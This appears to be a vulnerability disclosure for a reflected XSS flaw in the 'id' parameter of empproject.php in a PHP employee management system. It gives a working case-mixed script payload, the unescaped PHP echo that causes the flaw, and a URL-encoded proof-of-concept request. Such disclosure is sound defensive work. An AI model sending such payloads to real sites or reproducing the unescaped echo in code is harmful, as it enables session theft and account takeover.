## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/empproject.php` contains a Reflected XSS vulnerability

Impact of the vulnerability
An attacker can craft a malicious URL that injects JavaScript into the “My Projects” page. When a victim visits the URL, the injected script may execute in the victim’s browser, potentially leading to:

- Session hijacking (stealing cookies/tokens)
- Account takeover (performing actions as the victim)
- Phishing/UI manipulation (tampering with page content)

### Payload:

"><ScRiPt>alert(888)</sCrIpT>

```
"><ScRiPt>alert(888)</sCrIpT>
```

### POC:

The vulnerable endpoint is `GET /empproject.php?id=...`. The `id` query parameter is reflected into navigation link `href` attributes without HTML escaping:

<ul id="navli">

  <li><a class="homeblack" href="eloginwel.php?id=<?php echo $id?>"">HOME</a></li>

  <li><a class="homeblack" href="myprofile.php?id=<?php echo $id?>"">My Profile</a></li>

  <li><a class="homered" href="empproject.php?id=<?php echo $id?>"">My Projects</a></li>

  <li><a class="homeblack" href="applyleave.php?id=<?php echo $id?>"">Apply Leave</a></li>

</ul>

Send the following request (URL-encoded payload):

GET /empproject.php?id=%22%3E%3CScRiPt%3Ealert%28888%29%3C%2FsCrIpT%3E HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
The response HTML includes the injected string inside the navigation link `href` (as shown in your response snippet). When rendered in a browser, the injected JavaScript executes (e.g., `alert(888)`), confirming reflected XSS.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409153917063](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409153917063.png)